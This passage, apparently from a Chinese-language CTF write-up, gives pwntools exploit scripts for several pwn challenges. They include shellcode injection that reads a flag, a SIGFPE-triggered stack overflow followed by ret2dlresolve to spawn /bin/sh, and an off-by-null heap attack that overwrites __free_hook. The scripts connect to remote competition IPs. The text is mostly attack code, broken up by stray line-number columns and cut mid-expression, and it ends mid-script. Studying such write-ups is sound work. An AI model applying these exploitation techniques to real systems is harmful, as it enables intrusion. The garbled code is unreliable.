    add(fd,0,0x60,data);
    edit(fd,0,0x400,data);
    edit(fd,0,0,data);
    gift(fd,data);
    if(data[0]!=0){
       puts("[+] yes");
       kill(pid,SIGKILL);
       //kill(pid2,SIGKILL);
       break;
   }
  }
 for(int i=0;i>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(index))
    p.recvuntil(':')
1
2
3
4
5
6
7
8
9
10
11
12
13
    p.sendline(str(s))
    p.recvuntil(':')
    p.send(data)
def padding(s):
    context.log_level = 'info'
    s = asm(s)
    print(len(s))
    padding = '''jmp next\n''' + 'nop\n' * (0x20 + (8-len(s))-0xa) + 
'next:'
    padding = s + asm(padding)
    context.log_level = 'debug'
    return padding[:8]
def add_shell(s):
    add(0,8,padding(s))
def dele(i):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil(':')
    p.sendline(str(i))
s = '''
xor eax,eax
push 0x70
pop rdx
'''
add((0x202018 - 0x2020E0)/8,8,padding(s))
add_shell('''
mov rsi,rdi
xor rdi,rdi
syscall
''')
s = 'nop\n' * 8 + '''mov rbp,rsi\n'''
s += shellcraft.amd64.open('flag')
s += shellcraft.amd64.read('rax','rbp',0x100)
s += shellcraft.amd64.write(1,'rbp',0x100)
s += shellcraft.amd64.write(1,'rbp',0x1000)
s += '''
\nnext:
jmp next'''
# gdb.attach(proc.pidof(p)[0])
print(len(asm(s)))
dele(0)
p.send(asm(s))
p.interactive()
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
[强⽹先锋]no_output
⾸先将存的 fd 改为 0，然后⽤最⼤负数除-1 触发 SIGFPE 中的栈溢出
接着直接 ret2dlresolve 就可以了，pwntools ⾃带 payload ⽣成器
from pwn import *
# s = process("./test")
s = remote("39.105.138.97","1234")
context.terminal = ['ancyterm', '-s', 'host.docker.internal', '-p', 
'15111', '-t', 'iterm2', '-e']
# gdb.attach(s,"b *0x8049236\nc")
s.send("\x00")
raw_input(">")
s.send('A'*0x20)
raw_input(">")
s.send("hello_boy\x00")
raw_input(">")
s.sendline("-2147483648")
raw_input(">")
s.sendline("-1")
raw_input(">")
rop = ROP("./test")
elf = ELF("./test")
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())
print(hex(dlresolve.data_addr))
payload = 
'A'*76+p32(0x80490C0)+p32(0x8049582)+p32(0)+p32(0x804de00)+p32(0x8049030)+p
32(0x5a04)+p32(0)+p32(0x804de20)+"/bin/sh\x00"
s.sendline(payload)
raw_input(">")
payload= dlresolve.payload
s.sendline(payload)
s.interactive()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
babypwn
\x11 存在越界
malloc(0x200)产⽣ 0x211 的 chunk，使⽤ z3 解决输出的 encode 后很容易泄漏堆地址与 libc 地址。
进⾏ off-by-null 配合 ORW 即可
from pwn import *
# s = process("./babypwn",env=
{'LD_PRELOAD':'./libc.so.6:./libseccomp.so.2'})
s = remote("39.105.130.158","8888")
from z3 import *
def solve(target):
    a1 = BitVec('a1', 32)
    x = a1
1
2
3
4
5
6
7
8
9
10
11
    for _ in range(2):
        x ^= (32 * x) ^ LShR((x ^ (32 * x)),
                             17) ^ (((32 * x) ^ x ^ LShR((x ^ (32 * x)), 
17)) >> ","1")
    s.sendlineafter("size:",str(size))
def free(idx):
    s.sendlineafter(">>> ","2")
    s.sendlineafter("index:",str(idx))
def edit(idx,buf):
    s.sendlineafter(">>> ","3")
    s.sendlineafter("index:",str(idx))
    s.sendafter("content:",buf)
def show(idx):
    s.sendlineafter(">>> ","4")
    s.sendlineafter("index:",str(idx))
add(0x1f0)#0
add(0x200)#1
for i in range(2,9):
    add(0x1f0)
for i in range(2,9):
    free(i)
free(0)
for i in range(7):
    add(0x1f0)
    if i != 5:
        edit(i,(p64(0)+p64(0x21))*0x18)
add(0xa0)#8
show(8)
libc = ELF("./libc.so.6")
s.recvline()
tmp1 = solve(int('0x'+s.recvline(keepends=False),16))
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
tmp2 = solve(int('0x'+s.recvline(keepends=False),16))
libc.address = (tmp2<<32)+tmp1-0x3ebe90
success(hex(libc.address))
add(0x140)#9
free(8)
free(9)
show(5)
s.recvline()
tmp1 = solve(int('0x'+s.recvline(keepends=False),16))
tmp2 = solve(int('0x'+s.recvline(keepends=False),16))
heapbase = (tmp2<<32)+tmp1-0x1580+0x2c0
success(hex(heapbase))
add(0xa0)#8
add(0x148)#9
addr = heapbase+0xcb0
edit(9,'A'*0x148)
payload = p64(addr)*2
payload = payload.ljust(0x140,'A')+p64(0x150+0xa0)
edit(9,payload)
edit(8,p64(0)+p64(0x1f0)+p64(addr)*2)
edit(1,'A'*0x1f0+p64(0)+p64(0x251))
add(0x1f0)
free(0)
free(2)
free(3)
free(4)
free(5)
free(6)
free(7)
free(1)
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
setcontext = libc.sym['setcontext']+53
mprotect = libc.sym['mprotect']
add(0x120)#0
add(0x140)#1
free(1)
free(9)
edit(0,'./flag\x00\x00'+'A'*152+p64(free_hook))
add(0x140)#1
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
add(0x140)#2
context.arch = 'amd64'
sig = SigreturnFrame()